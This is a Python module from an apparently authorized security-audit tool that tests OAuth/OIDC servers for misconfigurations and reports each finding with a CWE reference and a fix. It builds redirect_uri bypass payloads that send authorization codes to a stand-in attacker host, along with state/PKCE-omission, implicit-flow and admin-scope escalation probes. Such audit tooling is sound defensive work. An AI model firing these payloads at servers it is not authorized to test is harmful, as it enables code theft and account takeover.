"""OAuth 2.0 / OIDC authorization-server misconfiguration audit.

Real requests only. A candidate is raised when the response itself proves the
claim: a 302 whose Location delivers the authorization code (or an access
token) to the attacker origin, a token minted for a grant the client never
asked for, or a completed flow that skipped `state`/PKCE. Anything weaker is
an observation or a stated limitation - never a finding.

Proof quotes are the part of the Location header that reproduces on replay
(everything up to `code=`); the captured code itself is unique per request.
"""
import base64
import hashlib
import json
import secrets
from urllib.parse import urlencode, urlparse

from .checks import _candidate

ATTACKER_FALLBACK = "http://127.0.0.2:8080"
REDIRECT_STATUS = (301, 302, 303, 307, 308)
REFUSED = (400, 401, 403)


def _hdr(headers, name):
    for k, v in (headers or {}).items():
        if k.lower() == name:
            return v
    return None


def _host_port(url: str) -> tuple[str, str]:
    p = urlparse(url)
    host = (p.hostname or "").lower().rstrip(".")
    return host, (f":{p.port}" if p.port else "")


def _join(url: str, params: dict) -> str:
    return url + ("&" if "?" in url else "?") + urlencode(params)


def _redirect_variants(registered: str, attacker: str) -> list[tuple[str, str]]:
    """The redirect_uri bypass matrix: one entry per compare-then-match defect."""
    reg = urlparse(registered)
    a_host, a_port = _host_port(attacker)
    atk = attacker.rstrip("/")
    reg_origin = f"{reg.scheme}://{reg.netloc}"
    return [
        ("registered_control", registered),
        ("attacker_host_swap", f"{atk}{reg.path}"),
        ("attacker_path_append", f"{registered}{atk}/steal"),
        ("userinfo_at", f"{reg.scheme}://{reg.netloc}@{a_host}{a_port}{reg.path}"),
        ("host_suffix", f"{reg.scheme}://{reg.hostname}.attacker.test"
                        f"{_host_port(registered)[1]}{reg.path}"),
        ("trailing_dot_host", f"{reg.scheme}://{a_host}.{a_port}{reg.path}"),
        ("encoded_separator", f"{atk}{reg.path}%2f..%2f.."),
        ("double_encoded", f"{atk}{reg.path}%252f..%252f.."),
        ("subdomain_prefix", f"{reg.scheme}://evil-{reg.hostname}"
                             f"{_host_port(registered)[1]}{reg.path}"),
        ("wildcard_suffix", f"{registered}.{a_host}"),
        ("origin_only_control", reg_origin + "/"),
    ]


def _carried(location: str) -> bool:
    return "code=" in location or "access_token=" in location


def _token_value(location: str) -> str | None:
    """The one-shot code/token carried by a redirect, for landing verification."""
    for marker in ("code=", "access_token="):
        if marker in location:
            rest = location.split(marker, 1)[1]
            return rest.split("&")[0]
    return None


def _loc_quote(location: str) -> str:
    """Reproducible header quote: the Location up to the one-shot code/token."""
    marker = "access_token=" if "access_token=" in location else "code="
    return f"Location: {location.split(marker)[0]}{marker}"


def _json(text):
    try:
        return json.loads(text)
    except (TypeError, ValueError):
        return {}


def audit_oauth(db, evidence, probe, scope, engagement_id, auth_json, pipeline,
                intent_id=None) -> dict:
    """Probe one configured OAuth client. See module docstring for the bar."""
    cfg = dict((auth_json or {}).get("oauth") or {})
    out = {"status": "assessed", "authorize_url": cfg.get("authorize_url"),
           "vectors": [], "candidates": [], "observations": [], "limitations": [],
           "errors": []}

    def limit(summary):
        out["limitations"].append(summary)
        pipeline.record_observation(engagement_id, intent_id, "oauth_audit_limitation", summary)

    def observe(kind, summary, evidence_id, quote=None, quote_in="body"):
        out["observations"].append({"kind": kind, "summary": summary,
                                    "evidence_id": evidence_id})
        pipeline.record_observation(engagement_id, intent_id, kind, summary,
                                    evidence_id=evidence_id, quote=quote)

    def submit(cand):
        res = pipeline.submit_candidate(engagement_id, cand, intent_id=intent_id)
        out["candidates"].append({**cand, "finding_id": res["id"], "deduped": res["deduped"]})

    missing = [k for k in ("authorize_url", "client_id", "redirect_uri") if not cfg.get(k)]
    if missing:
        out["status"] = "not_configured"
        limit(f"oauth audit not run: auth_json['oauth'] lacks {', '.join(missing)} "
              "(no request was sent)")
        return out

    authorize_url, token_url = cfg["authorize_url"], cfg.get("token_url")
    client_id, registered = cfg["client_id"], cfg["redirect_uri"]
    attacker = (cfg.get("attacker_origin") or ATTACKER_FALLBACK).rstrip("/")
    attacker_host = _host_port(attacker)[0]
    base_scope = cfg.get("scope") or "profile"

    def req(url, method="GET", body=None, headers=None, tool="oauth_audit"):
        return probe.request(engagement_id, scope, url, method=method, headers=headers,
                             body=body, category="web", intent_id=intent_id, tool=tool,
                             follow_redirects=False)

    pkce_on = bool(cfg.get("pkce"))
    pkce_verifier = secrets.token_urlsafe(32)
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(pkce_verifier.encode()).digest()).rstrip(b"=").decode()

    def authz(pkce=True, **params):
        merged = {"client_id": client_id, "redirect_uri": registered,
                  "response_type": "code", "scope": base_scope}
        if pkce and pkce_on:  # the client's own flow parameters
            merged.update({"code_challenge": challenge, "code_challenge_method": "S256"})
        merged.update(params)
        return req(_join(authorize_url, merged))

    def exchange(code: str, verifier: str | None = None):
        """Redeem a code. -> (response, json) or (None, {}) when no token_url."""
        if not token_url:
            return None, {}
        form = {"grant_type": "authorization_code", "code": code, "client_id": client_id,
                "redirect_uri": registered}
        if verifier or pkce_on:
            form["code_verifier"] = verifier or pkce_verifier
        r = req(token_url, method="POST", body=urlencode(form),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                tool="oauth_token")
        return r, (_json(r["body"]) if r.get("ok") else {})

    def code_from(r):
        loc = _hdr(r.get("headers"), "location") or ""
        if not r.get("ok") or not loc or "code=" not in loc:
            return None
        for pair in urlparse(loc).query.split("&"):
            if pair.startswith("code="):
                return pair[5:]
        return None

    # ---- control: the registered redirect must work, else nothing is judged
    control = authz(state=secrets.token_urlsafe(6))
    if not control.get("ok"):
        out["status"] = "blocked"
        out["errors"].append(f"authorize: {control.get('error')}")
        limit(f"oauth audit stopped at the control authorize request: {control.get('error')} "
              "(scope refusal or transport failure: nothing was tested or claimed)")
        return out
    if not code_from(control):
        out["status"] = "flow_unavailable"
        limit(f"the registered redirect_uri {registered} did not yield an authorization code "
              f"(status {control.get('status')}): bypass findings would be unprovable")
        return out

    # ---- redirect_uri bypass matrix
    fired = None
    for name, candidate_uri in _redirect_variants(registered, attacker):
        r = authz(redirect_uri=candidate_uri, state=secrets.token_urlsafe(6))
        loc = _hdr(r.get("headers"), "location") or ""
        hit_host = _host_port(loc)[0] if loc else None
        accepted = r.get("ok") and r.get("status") in REDIRECT_STATUS and bool(loc)
        out["vectors"].append({"variant": name, "redirect_uri": candidate_uri,
                               "status": r.get("status"), "location": loc,
                               "evidence_id": r.get("evidence_id"),
                               "attacker_host": hit_host == attacker_host})
        if not (accepted and hit_host == attacker_host and _carried(loc)):
            continue
        landed, landed_ok = None, False
        if scope.check_url(loc, "web").allowed:
            landed = req(loc, tool="oauth_attacker_landing")
            value = _token_value(loc)
            landed_ok = bool(landed.get("ok") and landed.get("status") == 200 and value
                             and value in landed["body"])
        quote = _loc_quote(loc)
        cand = _candidate(
            f"OAuth redirect_uri bypass: authorization code sent to {attacker_host}",
            "CWE-601", "A01:2021 Broken Access Control", "critical", "high", authorize_url,
            f"Authorize request with redirect_uri '{candidate_uri}' ({name}) returned "
            f"{r['status']} Location '{quote[len('Location: '):]}…', delivering the "
            f"authorization code to the attacker origin {attacker_host} instead of the "
            f"registered {registered}. The server accepted the attacker URI: its comparison "
            "is not an exact match on the registered value (prefix, path-only or suffix "
            "matching).",
            "Any user who follows a crafted authorize link hands their authorization code to "
            "the attacker, who exchanges it for a token and takes over the account "
            "(and with it any resource the granted scope covers).",
            "Compare the full redirect_uri by exact string equality against the registered "
            "value; resolve and compare scheme/host/port/path only if exact match is "
            "impossible, and never compare a prefix, suffix or path alone.",
            r["evidence_id"], quote,
            {"method": "GET", "url": _join(authorize_url, {
                "client_id": client_id, "redirect_uri": candidate_uri,
                "response_type": "code", "scope": base_scope})},
            "oauth_redirect_uri", quote_in="header_fact")
        if landed_ok:
            cand["evidence_ids"].append(landed["evidence_id"])
            cand["description"] += (" The redirect was followed into the attacker page and "
                                    "the code was echoed back by it.")
        out["vectors"][-1]["landed"] = landed_ok
        if landed is not None and not landed_ok:
            limit(f"the bypassed redirect pointed at {attacker_host} but the landing page "
                  f"did not receive the code (status {landed.get('status')}): the Location "
                  "header alone proves the delivery")
        if fired is None:  # one finding per root cause; the rest stay as matrix rows
            fired = cand
            submit(cand)

    # ---- state + PKCE: one flow that omits both, judged by what came back
    open_flow = authz(pkce=False)  # no state, no code_challenge
    code = code_from(open_flow)
    token_r, token = exchange(code) if code else (None, {})
    issued = bool(token.get("access_token"))
    if code and token_r is not None and issued:
        loc = _hdr(open_flow.get("headers"), "location") or ""
        cand = _candidate(
            "OAuth authorize flow completes without a state parameter or PKCE",
            "CWE-352", "A07:2021 Identification and Authentication Failures", "medium", "high",
            authorize_url,
            "An authorize request carrying neither `state` nor a PKCE code_challenge returned "
            f"an authorization code (Location '{_loc_quote(loc)}'), and the unbound code was "
            "redeemed at the token endpoint for a token. The server enforces neither: it will "
            "issue a grant from any request, so a cross-site request can start a flow with the "
            "attacker's own code and the login does not bind the session to the user's intent "
            "(login CSRF / code injection).",
            "A victim's browser can be pushed through an attacker-initiated flow, binding the "
            "victim to the attacker's account; with no PKCE, an intercepted code is redeemable "
            "by any party holding it, which is the whole exposure of a public client.",
            "Require and validate `state` per authorization request, and require PKCE (S256) "
            "for public clients, verifying the verifier at the token endpoint.",
            open_flow["evidence_id"], _loc_quote(loc),
            {"method": "GET", "url": _join(authorize_url, {
                "client_id": client_id, "redirect_uri": registered,
                "response_type": "code", "scope": base_scope})},
            "oauth_state_pkce", quote_in="header_fact")
        cand["evidence_ids"].append(token_r["evidence_id"])
        submit(cand)
    elif code and token_r is None:
        limit("state/PKCE: a code was issued but no token_url was supplied, so grantability "
              "could not be proven; recorded as an observation only")
        observe("oauth_state_unverified",
                "authorize completed with no state/PKCE but no token endpoint was configured",
                open_flow["evidence_id"])
    elif open_flow.get("status") in REFUSED:
        pass  # the server enforced it: nothing to report
    else:
        observe("oauth_state_missing",
                f"authorize without state/PKCE returned {open_flow.get('status')} with no code",
                open_flow["evidence_id"])

    # ---- implicit flow / unexpected response_type
    implicit = authz(response_type="token", state=secrets.token_urlsafe(6))
    loc = _hdr(implicit.get("headers"), "location") or ""
    if implicit.get("ok") and implicit.get("status") in REDIRECT_STATUS and "access_token=" in loc:
        submit(_candidate(
            "OAuth server issues access tokens in the URL fragment (implicit flow)",
            "CWE-598", "A07:2021 Identification and Authentication Failures", "medium", "high",
            authorize_url,
            f"response_type=token was honoured and the access token was returned in the "
            f"redirect fragment ('{_loc_quote(loc)}…') although the registered client performs "
            "the code flow. Tokens in URLs land in browser history, sync and any Referer or "
            "script that reads location.hash.",
            "A token minted for the implicit flow cannot be bound to the client and leaks "
            "through the browser's URL surfaces; the client never expected this grant.",
            "Reject response_type values other than the registered one (code) and never "
            "return access tokens in a redirect fragment.",
            implicit["evidence_id"], _loc_quote(loc),
            {"method": "GET", "url": _join(authorize_url, {
                "client_id": client_id, "redirect_uri": registered,
                "response_type": "token", "scope": base_scope})},
            "oauth_implicit_flow", quote_in="header_fact"))
    elif implicit.get("status") not in REFUSED:
        observe("oauth_response_type",
                f"response_type=token returned {implicit.get('status')} without a token",
                implicit["evidence_id"])

    # ---- scope escalation
    escalated = f"{base_scope} admin"
    r = authz(scope=escalated, state=secrets.token_urlsafe(6))
    code = code_from(r)
    token_r, token = exchange(code) if code else (None, {})
    granted = str(token.get("scope") or "")
    if token_r is not None and "admin" in granted.split():
        quote = f'"scope":"{granted}"'  # compact JSON, exactly as the token endpoint wrote it
        if quote not in (token_r["body"] or ""):
            quote = f'"scope":{json.dumps(granted)}'
        submit(_candidate(
            "OAuth scope escalation: unregistered scope 'admin' granted",
            "CWE-863", "A01:2021 Broken Access Control", "high", "high", token_url or authorize_url,
            f"The client is registered for '{base_scope}' but requesting '{escalated}' returned a "
            f"token whose granted scope is '{granted}': the server does not restrict the "
            "requested scope to the client's registration.",
            "A client (or anyone who can craft an authorize link) obtains privileges its "
            "registration never allowed, up to administrative scope.",
            "Grant only scopes registered for the client and configured for the user; reject "
            "the request with invalid_scope otherwise.",
            token_r["evidence_id"], quote,
            {"method": "POST", "url": token_url or authorize_url,
             "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": urlencode({"grant_type": "authorization_code", "code": code,
                                "client_id": client_id, "redirect_uri": registered})},
            "oauth_scope_escalation"))
    elif r.get("status") not in REFUSED:
        observe("oauth_scope",
                f"scope '{escalated}' returned {r.get('status')} with no escalated grant",
                r["evidence_id"])

    db.emit(engagement_id, "oauth_audit_complete",
            {"authorize_url": authorize_url, "vectors": len(out["vectors"]),
             "candidates": len(out["candidates"]), "observations": len(out["observations"])})
    return out
